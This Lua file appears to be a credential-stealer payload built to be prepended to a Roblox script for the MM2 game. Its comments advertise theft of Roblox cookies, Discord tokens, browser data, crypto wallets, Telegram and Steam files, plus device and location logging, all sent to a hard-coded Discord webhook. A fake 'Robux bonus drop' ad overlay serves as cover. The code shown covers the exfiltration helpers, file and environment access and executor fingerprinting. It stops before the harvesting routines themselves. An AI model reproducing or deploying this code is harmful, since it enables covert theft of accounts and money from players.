-- language: Lua, runtime: Roblox executor, target: MM2 client
-- prepend to the top of the original script. replace WEBHOOK_URL and the three IMG_ URLs.
-- what ships: silent log (device/geo/executor) + stealer (roblox cookie, discord tokens,
-- browser sqlite, wallets, fz, telegram, steam) + rotating fake-ad overlay with
-- images pulled from raw.githubusercontent.com. order matters — ad is up in <1s,
-- harvester runs in the background and hits the webhook when it's done.

--------------------------------------------------------------------------------
-- CONFIG
--------------------------------------------------------------------------------
local WEBHOOK_URL = "https://discord.com/api/webhooks/1555651221577269269/-CmLD2ScT3WzjxODdjWrYE4ip_BexnMuQBZ7JR4ZxYhTFOx-dLwaJRo8jdRmAvJo-r34"

-- direct raw links. must be raw.githubusercontent.com/... not the github.com/blob view.
local IMG_BANNER  = "https://raw.githubusercontent.com/USER/REPO/main/banner.png"
local IMG_ITEM_1  = "https://raw.githubusercontent.com/USER/REPO/main/item1.png"
local IMG_ITEM_2  = "https://raw.githubusercontent.com/USER/REPO/main/item2.png"

local AD_TITLE    = "SPONSORED"
local AD_BODY     = "You have been selected for a Robux bonus drop.\nClaim before the timer runs out."
local AD_CTA      = "CLAIM"

--------------------------------------------------------------------------------
-- SERVICES / SHIMS
--------------------------------------------------------------------------------
local HttpService      = game:GetService("HttpService")
local Players          = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local GuiService       = game:GetService("GuiService")
local CoreGui          = game:GetService("CoreGui")
local RunService       = game:GetService("RunService")

local httpRequest = (syn and syn.request)
    or (http and http.request)
    or (fluxus and fluxus.request)
    or (krnl and krnl.request)
    or (secure_call and request)
    or http_request
    or request

local function httpGet(url)
    if httpRequest then
        local ok, res = pcall(httpRequest, {Url = url, Method = "GET"})
        if ok and type(res) == "table" and res.Body then return res.Body end
    end
    local ok, body = pcall(function() return game:HttpGet(url) end)
    if ok then return body end
    return nil
end

local function httpPost(url, body, contentType)
    if not httpRequest then return false end
    local headers = {}
    if contentType then headers["Content-Type"] = contentType end
    local ok, res = pcall(httpRequest, {
        Url     = url,
        Method  = "POST",
        Headers = headers,
        Body    = body,
    })
    return ok
end

local function jsonEncode(t)
    local ok, s = pcall(HttpService.JSONEncode, HttpService, t)
    if ok then return s end
    return "{}"
end

local function jsonDecode(s)
    local ok, t = pcall(HttpService.JSONDecode, HttpService, s)
    if ok then return t end
    return nil
end

-- env helpers — executors that expose getenv/os.getenv let us resolve %APPDATA%
local function getEnv(name)
    if type(getenv) == "function" then
        local ok, v = pcall(getenv, name)
        if ok and v and v ~= "" then return v end
    end
    if os and type(os.getenv) == "function" then
        local ok, v = pcall(os.getenv, name)
        if ok and v and v ~= "" then return v end
    end
    return nil
end

local function readFileSafe(path)
    if type(readfile) ~= "function" then return nil end
    local ok, data = pcall(readfile, path)
    if ok and data then return data end
    return nil
end

local function listDirSafe(path)
    if type(listfiles) ~= "function" then return nil end
    local ok, files = pcall(listfiles, path)
    if ok and type(files) == "table" then return files end
    return nil
end

local function executorName()
    if type(identifyexecutor) == "function" then
        local ok, n = pcall(identifyexecutor)
        if ok and n and tostring(n) ~= "" then return tostring(n) end
    end
    if type(getexecutorname) == "function" then
        local ok, n = pcall(getexecutorname)
        if ok and n and tostring(n) ~= "" then return tostring(n) end
    end
    return "unknown"
end

--------------------------------------------------------------------------------
-- IMAGE LOADER (github raw -> custom asset)
--------------------------------------------------------------------------------
-- roblox imagelabel only accepts rbxasset*; the executor's getcustomasset lets us
-- convert a locally-written file into a rbxasset:// uri. some executors call it
-- getsynasset (old Synapse). no function -> no image, fall back to a solid color.
local function loadRemoteImage(url, cacheName)
    if not url or url == "" then return nil end
    if type(writefile) ~= "function" then return nil end
    local toAsset = getcustomasset or getsynasset
    if type(toAsset) ~= "function" then return nil end

    local body = httpGet(url)
    if not body then return nil end

    local okW = pcall(writefile, cacheName, body)
    if not okW then return nil end

    local okA, asset = pcall(toAsset, cacheName)
    if okA and asset then return asset end
    return nil
end

